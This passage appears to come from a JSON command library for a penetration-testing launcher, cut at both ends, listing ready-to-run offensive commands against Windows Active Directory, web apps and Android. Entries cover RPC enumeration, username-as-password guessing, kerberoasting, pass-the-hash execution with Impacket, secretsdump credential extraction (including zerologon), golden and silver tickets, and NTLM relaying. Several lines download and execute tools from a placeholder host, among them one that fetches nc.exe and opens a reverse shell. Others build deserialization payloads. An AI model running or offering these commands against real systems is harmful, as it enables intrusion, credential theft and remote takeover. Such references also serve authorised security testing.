"custom", "executable_path": "rpcclient", "arguments": "<ip> -c \"lookupnales <name>; wmic useraccount get name,sid; quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - querydominfo", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<password>\" -c \"querydominfo;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - getdompwinfo  (password policy)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<password>\" -c \"getdompwinfo;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - netshareenum  (password policy)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<password>\" -c \"netshareenum;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "Trying all username as password from list of users", "description": "", "executable_type": "custom", "executable_path": "for", "arguments": "u in `cat <file>`; do echo -n \"user: $u \" && rpcclient -U \"$u%$u\" -c \"getusername;quit\" <ip>; done", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - enum (Enum commands list)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"enum;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - enumdomains (Current domain)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"enumdomains;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - enumdomgroups (Enum Domain groups)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"enumdomgroups;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - querygroup (Enum Group Information)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"querygroup <RID>;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - querygroupmem (Enum Group Membership)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"querygroupmem <RID>;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - queryuser (Enumerate specific User/ computer information by RID)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"queryuser <RID>;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - getusrdompwinfo (User password policies)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"getusrdompwinfo <RID>;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - lsaenumsid (Local Users LSA Enum SID)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"lsaenumsid;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - lookupsid (Local Users Lookup SID)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"lookupsid <SID>;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - setuserinfo2 (Reset AD user password)", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<pass>\" -c \"setuserinfo2 <LOGIN> 23 '<NEWPASSWORD>';quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "inject ticket from file", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "ptt /ticket:<ticket>", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "load rubeus from powershell", "description": "", "executable_type": "custom", "executable_path": "$data", "arguments": "= (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "monitor", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "monitor /interval:5 /filteruser:<machine_account>", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "inject ticket from b64 blob", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "ptt /ticket:<BASE64BLOBHERE>", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "check ASPREPRoast for all users in current domain", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "asreproast  /format:<AS_REP_response_format> /outfile:<output_hashes_file>", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "ASREPRoast specific user", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "asreproast  /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "kerberoasting - current domain", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "kerberoast /outfile:<output_TGSs_file>", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "Kerberoasting and outputting on a file with a spesific format", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "Kerberoasting while being \"OPSEC\" safe, essentially while not try to roast AES enabled accounts", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "Kerberoast AES enabled accounts", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /aes", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "Kerberoast specific user account", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<user> /simple", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "get hash", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "hash /user:<user> /domain:<domain_name> /password:<password>", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "dump - will dump any relevant cached TGS ticket\u2019s stored", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "dump", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "ask and inject ticket", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "S4U - with ticket - Constrained delegation", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "S4U - with hash - Constrained delegation", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "get rc4 of machine with the password", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "hash /password:<machine_password>", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "S4U - Resource based constrained delegation", "description": "", "executable_type": "custom", "executable_path": ".\\Rubeus.exe", "arguments": "s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "Rubeus Reflection assembly", "description": "", "executable_type": "custom", "executable_path": "$data", "arguments": "= (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe');\\\n$assem = [System.Reflection.Assembly]::Load($data);\\\n[Rubeus.Program]::Main(\"<rubeus_cmd>\".Split())", "tags": "[\"ad\", \"windows\", \"rubeus\"]", "more_info_url": null}, {"name": "lookupsid - SID User Enumeration,  extract the information about what users exist and their data. ", "description": "", "executable_type": "custom", "executable_path": "lookupsid.py", "arguments": "<domain>/<user>:<password>@<ip>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "reg - query registry info remotely", "description": "", "executable_type": "custom", "executable_path": "reg.py", "arguments": "<domain>/<user>:<password>@<ip> query -keyName HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows -s", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "rpcdump - list rpc endpoint", "description": "", "executable_type": "custom", "executable_path": "rpcdump.py", "arguments": "<domain>/<user>:<password>@<ip>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "services.py - (start, stop, delete, read status, config, list, create and change any service) remote", "description": "", "executable_type": "custom", "executable_path": "services.py", "arguments": "<domain>/<user>:<password>@<ip> <action>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "getarch - find target architecture (64 or 32 bits)", "description": "", "executable_type": "custom", "executable_path": "getArch.py", "arguments": "-target <ip>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "netview - enumeration tool (ip/shares/sessions/logged users) - need dns set", "description": "", "executable_type": "custom", "executable_path": "netview.py", "arguments": "<domain>/<user> -target <ip> -users <users_file>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "PSEXEC with username", "description": "create a new service (using \\pipe\\svcctl via SMB)", "executable_type": "custom", "executable_path": "psexec.py", "arguments": "<domain>/<user>:<password>@<ip>", "tags": "[\"impacket\", \"windows\", \"exec\"]", "more_info_url": null}, {"name": "PSEXEC with pass the Hash (pth)", "description": "create a new service (using \\pipe\\svcctl via SMB)", "executable_type": "custom", "executable_path": "psexec.py", "arguments": "-hashes <hash> <user>@<ip>", "tags": "[\"impacket\", \"windows\", \"exec\"]", "more_info_url": null}, {"name": "PSEXEC with kerberos", "description": "create a new service (using \\pipe\\svcctl via SMB)", "executable_type": "custom", "executable_path": "export", "arguments": "KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>", "tags": "[\"impacket\", \"windows\", \"exec\"]", "more_info_url": null}, {"name": "wmiexec", "description": "Execute a command shell without touching the disk or running a new service using DCOM", "executable_type": "custom", "executable_path": "wmiexec.py", "arguments": "<domain>/<user>:<password>@<ip>", "tags": "[\"impacket\", \"windows\", \"exec\"]", "more_info_url": null}, {"name": "wmiexec  with pass the hash (pth) ", "description": "Execute a command shell without touching the disk or running a new service using DCOM", "executable_type": "custom", "executable_path": "wmiexec.py", "arguments": "-hashes <hash> <user>@<ip>", "tags": "[\"impacket\", \"windows\", \"exec\"]", "more_info_url": null}, {"name": "atexec - execute command view the task scheduler ", "description": "Using \\pipe\\atsvc via SMB", "executable_type": "custom", "executable_path": "atexec.py", "arguments": "<domain>/<user>:<password>@<ip> \"command\"", "tags": "[\"impacket\", \"windows\", \"exec\"]", "more_info_url": null}, {"name": "atexec pass the hash (pth)", "description": "Execute command view the task scheduler (using \\pipe\\atsvc via SMB)", "executable_type": "custom", "executable_path": "atexec.py", "arguments": "-hashes <hash> <user>@<ip> \"command\"", "tags": "[\"impacket\", \"windows\", \"exec\"]", "more_info_url": null}, {"name": "smbclient - connect to smb on the target", "description": "A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination.\n-hashes : <LMHASH:NTHASH>\n-no-pass -k : kerberos authentication", "executable_type": "custom", "executable_path": "smbclient.py", "arguments": "<domain>/<user>:<password>@<ip>", "tags": null, "more_info_url": null}, {"name": "GetNPUsers without password to get TGT (ASREPRoasting)", "description": "", "executable_type": "custom", "executable_path": "GetNPUsers.py", "arguments": "<domain>/<user> -no-pass -request -format hashcat", "tags": "[\"impacket\", \"windows\", \"kerberos\", \"88\"]", "more_info_url": null}, {"name": "GetNPUsers - attempt to list and get TGTs for those users that have the property \u2018Do not require Kerberos preauthentication\u2019 (ASREPRoasting)", "description": "", "executable_type": "custom", "executable_path": "GetNPUsers.py", "arguments": "-dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat", "tags": "[\"impacket\", \"windows\", \"kerberos\", \"88\"]", "more_info_url": null}, {"name": "GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)", "description": "", "executable_type": "custom", "executable_path": "GetUserSPNs.py", "arguments": "-request -dc-ip <dc_ip> <domain>/<user>:<password>", "tags": "[\"impacket\", \"windows\", \"kerberos\", \"88\"]", "more_info_url": null}, {"name": "MS14-068 - goldenPac", "description": "", "executable_type": "custom", "executable_path": "goldenPac.py", "arguments": "-dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>", "tags": "[\"impacket\", \"windows\", \"kerberos\", \"88\"]", "more_info_url": null}, {"name": "Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.", "description": "", "executable_type": "custom", "executable_path": "ticketer.py", "arguments": "-nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>", "tags": "[\"impacket\", \"windows\", \"kerberos\", \"88\"]", "more_info_url": null}, {"name": "TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket", "description": "", "executable_type": "custom", "executable_path": "ticketConverter.py", "arguments": "<ccache_ticket_file> <ticket_kirbi_file>", "tags": "[\"impacket\", \"windows\", \"kerberos\", \"88\"]", "more_info_url": null}, {"name": "Silver ticket - impersonate user", "description": "", "executable_type": "custom", "executable_path": "getST.py", "arguments": "-spn cifs/<target> <domain>/<netbios_name>\\$ -impersonate <user>", "tags": "[\"impacket\", \"windows\", \"kerberos\", \"88\"]", "more_info_url": null}, {"name": "GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey", "description": "", "executable_type": "custom", "executable_path": "getTGT.py", "arguments": "-dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>", "tags": "[\"impacket\", \"windows\", \"kerberos\", \"88\"]", "more_info_url": null}, {"name": "GetADUser - gather data about the domain\u2019s users and their corresponding email addresses", "description": "", "executable_type": "custom", "executable_path": "GetADUsers.py", "arguments": "-all <domain>/<user>:<password> -dc-ip <dc_ip>", "tags": "[\"impacket\", \"windows\", \"kerberos\", \"88\"]", "more_info_url": null}, {"name": "smbserver - share smb folder", "description": "A Python implementation of an SMB server. Allows to quickly set up shares and user accounts.", "executable_type": "custom", "executable_path": "smbserver.py", "arguments": "<shareName> <sharePath>", "tags": null, "more_info_url": null}, {"name": "smbserver - share smb folder with authentication", "description": "", "executable_type": "custom", "executable_path": "smbserver.py", "arguments": "-username <username> -password <password> <shareName> <sharePath>", "tags": null, "more_info_url": null}, {"name": "ntlmrelay - host a payload that will automatically be served to the remote host connecting", "description": "", "executable_type": "custom", "executable_path": "ntlmrelayx.py", "arguments": "-tf <targets_file> -smb2support -e <payload_file|payload.exe>", "tags": null, "more_info_url": null}, {"name": "ntlmrelay - socks", "description": "", "executable_type": "custom", "executable_path": "ntlmrelayx.py", "arguments": "-tf <targets_file> -socks -smb2support", "tags": null, "more_info_url": null}, {"name": "ntlmrelay - authenticate and dump hash", "description": "", "executable_type": "custom", "executable_path": "ntlmrelayx.py", "arguments": "-tf <targets_file> -smb2support", "tags": null, "more_info_url": null}, {"name": "ntlmrelay - to use with mitm6 - relay to target", "description": "Next use the socks with proxychains :\nproxychains smbclient //ip/Users -U domain/user", "executable_type": "custom", "executable_path": "ntlmrelayx.py", "arguments": "-6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug", "tags": null, "more_info_url": null}, {"name": "ntlmrelay - to use with mitm6 - delegate access", "description": "", "executable_type": "custom", "executable_path": "ntlmrelayx.py", "arguments": "-t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access", "tags": null, "more_info_url": null}, {"name": "samrdump - system account, shares, etc... (dump info from the Security Account Manager (SAM))", "description": "", "executable_type": "custom", "executable_path": "samrdump.py", "arguments": "<domain>/<user>:<password>@<ip>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "secretsdump", "description": "", "executable_type": "custom", "executable_path": "secretsdump.py", "arguments": "'<domain>/<user>:<password>'@<ip>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "secretsdump local dump - extract hash from sam database", "description": "", "executable_type": "custom", "executable_path": "secretsdump.py", "arguments": "-system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "secretsdump local dump - extract hash from ntds.dit", "description": "", "executable_type": "custom", "executable_path": "secretsdump.py", "arguments": "-ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "secretsdump - anonymous get administrator ", "description": "zerologon", "executable_type": "custom", "executable_path": "secretsdump.py", "arguments": "<domain>/<dc_bios_name>\\$/@<ip> -no-pass -just-dc-user \"Administrator\"", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "secretsdump - remote extract", "description": "", "executable_type": "custom", "executable_path": "secretsdump.py", "arguments": "-just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "secretsdump - remote extract + users infos", "description": "", "executable_type": "custom", "executable_path": "secretsdump.py", "arguments": "-just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>", "tags": "[\"impacket\", \"windows\", \"smb\", \"445\"]", "more_info_url": null}, {"name": "python Simple HTTP server", "description": "", "executable_type": "custom", "executable_path": "python", "arguments": "-m SimpleHTTPServer <lport>", "tags": "[\"server\"]", "more_info_url": null}, {"name": "python3 Simple HTTP server", "description": "", "executable_type": "custom", "executable_path": "python3", "arguments": "-m http.server <lport>", "tags": "[\"server\"]", "more_info_url": null}, {"name": "php Simple builtin server", "description": "", "executable_type": "custom", "executable_path": "php", "arguments": "-S 0.0.0.0:<lport>", "tags": "[\"server\"]", "more_info_url": null}, {"name": "download with certutil", "description": "", "executable_type": "custom", "executable_path": "certutil.exe", "arguments": "-urlcache -split -f http://<server>/<source_file> <dest_file>", "tags": "[\"windows\", \"certutil\"]", "more_info_url": null}, {"name": "download with  certutil (2)", "description": "", "executable_type": "custom", "executable_path": "certutil.exe", "arguments": "-verifyctl -f -split h http://<server>/<source_file> <dest_file>", "tags": "[\"windows\", \"certutil\"]", "more_info_url": null}, {"name": "Encode in base64 with certutil ", "description": "", "executable_type": "custom", "executable_path": "certutil", "arguments": "-decode enc.txt <file>", "tags": "[\"windows\", \"certutil\"]", "more_info_url": null}, {"name": "Download with powershell", "description": "", "executable_type": "custom", "executable_path": "powershell.exe", "arguments": "-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile \"(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<dest_file>')\"", "tags": "[\"powershell\", \"download\"]", "more_info_url": null}, {"name": "Download and execute with powershell", "description": "", "executable_type": "custom", "executable_path": "powershell.exe", "arguments": "-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile New-Object System.Net.WebClient.DownloadFile('<url_file>','nc.exe'); nc.exe <ip> <port> -e cmd.exe", "tags": "[\"powershell\", \"download\"]", "more_info_url": null}, {"name": "Download file with bitsadmin", "description": "", "executable_type": "custom", "executable_path": "bitsadmin", "arguments": "/Transfer myJob http://<ip>/<file|file.txt> <path|C:\\windows\\temp>", "tags": "[\"windows\", \"certutil\"]", "more_info_url": null}, {"name": "ysoserial.net - generate payload VIEWSTATE", "description": "", "executable_type": "custom", "executable_path": "ysoserial.exe", "arguments": "-p ViewState  -g TextFormattingRunProperties -c \"powershell -EncodedCommand <base64_encoded_command>\" --path=\"<asp_file_webroot_relative_path>\" --apppath=\"<application_path_webroot_relative>\" --decryptionalg=\"3DES\" --decryptionkey=\"<decryption_key>\" --validationalg=\"SHA1\" --validationkey=\"<validation_state>\"", "tags": "[\".net\", \"unserialize\"]", "more_info_url": null}, {"name": "ysoserial.net - calc.exe payload for Json.Net using ObjectDataProvider gadget.", "description": "", "executable_type": "custom", "executable_path": "ysoserial.exe", "arguments": "-f <lib|Json.Net> -g <gadget|ObjectDataProvider> -o raw -c \"<command|calc.exe>\" -t", "tags": "[\".net\", \"unserialize\"]", "more_info_url": null}, {"name": "ysoserial java - generate payload", "description": "https://github.com/frohoff/ysoserial", "executable_type": "custom", "executable_path": "java", "arguments": "-jar ysoserial.jar <lib_payload> 'powershell.exe -EncodedCommand <base64_encoded_command>' > <output_file>", "tags": "[\"java\", \"unserialize\"]", "more_info_url": "https://github.com/frohoff/ysoserial"}, {"name": "convert file to base64 one line", "description": "", "executable_type": "custom", "executable_path": "iconv", "arguments": "-f ASCII -t UTF-16LE <file_to_convert> | base64 | tr -d \"\\n\"", "tags": "[\"java\", \"unserialize\"]", "more_info_url": null}, {"name": "Patch the app", "description": "", "executable_type": "custom", "executable_path": "objection", "arguments": "patchapk -s <package>", "tags": "[\"objection\", \"android\", \"ios\", \"frida,\"]", "more_info_url": null}, {"name": "Patch the app without resource decoding", "description": "", "executable_type": "custom", "executable_path": "objection", "arguments": "patchapk -D -s <package>", "tags": "[\"objection\", \"android\", \"ios\", \"frida,\"]", "more_info_url": null}, {"name": "Patch the app with debug flag", "description": "", "executable_type": "custom", "executable_path": "objection", "arguments": "patchapk -d -s <package>", "tags": "[\"objection\", \"android\", \"ios\", \"frida,\"]", "more_info_url": null}, {"name": "Launch explore", "description": "", "executable_type": "custom", "executable_path": "objection", "arguments": "explore", "tags": "[\"objection\", \"android\", \"ios\", \"frida,\"]", "more_info_url": null}, {"name": "Launch explore with startup command", "description": "", "executable_type": "custom", "executable_path": "objection", "arguments": "explore -s <command>", "tags": "[\"objection\", \"android\", \"ios\", \"frida,\"]", "more_info_url": null}, {"name": "Launch explore without default ssl pinning bypass", "description": "", "executable_type": "custom", "executable_path": "objection", "arguments": "explore -s \"android sslpinning disable\"", "tags": "[\"objection\", \"android\", \"ios\", \"frida,\"]", "more_info_url": null}, {"name": "Launch explore with startup script", "description": "", "executable_type": "custom", "executable_path": "objection", "arguments": "explore -S <patch_to_script>", "tags": "[\"objection\", \"android\", \"ios\", \"frida,\"]", "more_info_url": null}, {"name": "Get property", "description": "", "executable_type": "custom", "executable_path": "adb", "arguments": "-s <device> shell getprop <property>", "tags": "[\"android\", \"device\", \"adb\", \"bridge\"]", "more_info_url": null}, {"name": "Install APK", "description": "", "executable_type": "custom", "executable_path": "adb", "arguments": "-s <device> install -r <path>", "tags": "[\"android\", \"device\", \"adb\", \"bridge\"]", "more_info_url": null}, {"name": "Uninstall package", "description": "", "executable_type": "custom", "executable_path": "adb", "arguments": "-s <device> uninstall -r <package>", "tags": "[\"android\", \"device\", \"adb\", \"bridge\"]", "more_info_url": null}, {"name": "Clear user data for package", "description": "", "executable_type": "custom", "executable_path": "adb", "arguments": "-s <device> shell pm clear <package>", "tags": "[\"android\", \"device\", \"adb\", \"bridge\"]", "more_info_url": null}, {"name": "Dispatch a deep-link / open URI", "description": "", "executable_type": "custom", "executable_path": "adb", "arguments": "-s <device> shell am start <uri>", "tags": "[\"android\", \"device\", \"adb\", \"bridge\"]", "more_info_url": null}, {"name": "Download apk", "description": "", "executable_type": "custom", "executable_path": "adb", "arguments": "pull \"$(adb shell pm path \"$(adb shell pm list packages | grep <package> | cut -d : -f 2)\" | cut -d : -f 2)\" .", "tags": "[\"android\", \"device\", \"adb\", \"bridge\"]", "more_info_url": null}, {"name": "Sign apk with Uber-apk-signer", "description": "", "executable_type": "custom", "executable_path": "java", "arguments": "-jar uber-apk-signer-1.1.0.jar -a <app>", "tags": "[\"android\", \"device\", \"adb\", \"bridge\"]", "more_info_url": null}, {"name": "Decompile an app", "description": "", "executable_type": "custom", "executable_path": "jadx", "arguments": "-d \"$(pwd)/out\" \"$(pwd)/<app>\"", "tags": "[\"android\", \"reverse\", \"jadx\"]", "more_info_url": null}, {"name": "Decompress an app ", "description": "", "executable_type": "custom", "executable_path": "apktool", "arguments": "d <apk>", "tags": "[\"android\", \"reverse\", \"jadx\"]", "more_info_url": null}, {"name": "Build an app ", "description": "", "executable_type": "custom", "executable_path": "apktool", "arguments": "b <apk>", "tags": "[\"android\", \"reverse\", \"jadx\"]", "more_info_url": null}, {"name": "drupwn classic", "description": "", "executable_type": "custom", "executable_path": "drupwn", "arguments": "--users --nodes --modules --dfiles --themes enum <url>", "tags": "[\"drupal\", \"drupwn\"]", "more_info_url": null}, {"name": "drupwn, docker", "description": "", "executable_type": "custom", "executable_path": "sudo", "arguments": "docker run --rm -it immunit/drupwn --users --nodes --modules --dfiles --themes enum <url>", "tags": "[\"drupal\", \"drupwn\"]", "more_info_url": null}, {"name": "gobuster scan classic", "description": "", "executable_type": "custom", "executable_path": "gobuster", "arguments": "dir -u <url> -w <wordlist>", "tags": "[\"fuzzer\", \"fuzz\", \"gobuster\"]", "more_info_url": null}, {"name": "gobuster scan pentest classic fuzz", "description": "", "executable_type": "custom", "executable_path": "gobuster", "arguments": "dir -u <url> -w <wordlist> -x json,html,php,txt,xml,md", "tags": "[\"fuzzer\", \"fuzz\", \"gobuster\"]", "more_info_url": null}, {"name": "gobuster scan high rate", "description": "", "executable_type": "custom", "executable_path": "gobuster", "arguments": "dir -u <url> -w <wordlist> -t 30", "tags": "[\"fuzzer\", \"fuzz\", \"gobuster\"]", "more_info_url": null}, {"name": "gobuster scan with adding extension", "description": "", "executable_type": "custom", "executable_path": "gobuster", "arguments": "dir -u <url> -w <wordlist> -x json,html,php,txt", "tags": "[\"fuzzer\", \"fuzz\", \"gobuster\"]", "more_info_url": null}, {"name": "wfuzz with number on url ( url : http://site/ )", "description": "", "executable_type": "custom", "executable_path": "wfuzz", "arguments": "-z range,1-1000 -u <url>FUZZ", "tags": "[\"fuzzer\", \"fuzz\", \"wfuzz\"]", "more_info_url": null}, {"name": "wfuzz with wordlist on url ( url : http://site/ )", "description": "", "executable_type": "custom", "executable_path": "wfuzz", "arguments": "-z file,<file> -u <url>FUZZ", "tags": "[\"fuzzer\", \"fuzz\", \"wfuzz\"]", "more_info_url": null}, {"name": "wfuzz on post parameter", "description": "", "executable_type": "custom", "executable_path": "wfuzz", "arguments": "-z file,<file> -X post -u <url> -d 'FUZZ=1'", "tags": "[\"fuzzer\", \"fuzz\", \"wfuzz\"]", "more_info_url": null}, {"name": "dirb commons", "description": "", "executable_type": "custom", "executable_path": "dirb", "arguments": "<url> -w /usr/share/wordlists/dirb/common.txt", "tags": "[\"fuzzer\", \"fuzz\", \"dirb\"]", "more_info_url": null}, {"name": "ffuf fuzz keyword in url", "description": "", "executable_type": "custom", "executable_path": "ffuf", "arguments": "-w <wordlist> -u <url>/FUZZ", "tags": "[\"fuzzer\", \"fuzz\", \"ffuf\"]", "more_info_url": null}, {"name": "ffuf fuzz Host filter response size", "description": "", "executable_type": "custom", "executable_path": "ffuf", "arguments": "-w <wordlist> -u <url> -H \"Host: FUZZ\" -fs <response_size>", "tags": "[\"fuzzer\", \"fuzz\", \"ffuf\"]", "more_info_url": null}, {"name": "ffuf GET parameter fuzzing", "description": "", "executable_type": "custom", "executable_path": "ffuf", "arguments": "-w <wordlist> -u <url>?<param>=FUZZ -fs <response_size>", "tags": "[\"fuzzer\", \"fuzz\", \"ffuf\"]", "more_info_url": null}, {"name": "ffuf POST parameter fuzzing and filter response code 401", "description": "", "executable_type": "custom", "executable_path": "ffuf", "arguments": "-w <wordlist> -u <url> -X POST -d \"username=admin\\&password=FUZZ\" -fc 401", "tags": "[\"fuzzer\", \"fuzz\", \"ffuf\"]", "more_info_url": null}, {"name": "nikto - first vuln scan", "description": "", "executable_type": "custom", "executable_path": "nikto", "arguments": "-C all -h <url>", "tags": "[\"fuzzer\", \"fuzz\", \"nikto\"]", "more_info_url": null}, {"name": "Create a new signing request and key", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "req -new -newkey rsa:<RSA_LENGTH> -nodes -out <OUTPUT_CSR> -keyout <OUTPUT_KEY>", "tags": "[\"openssl\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": 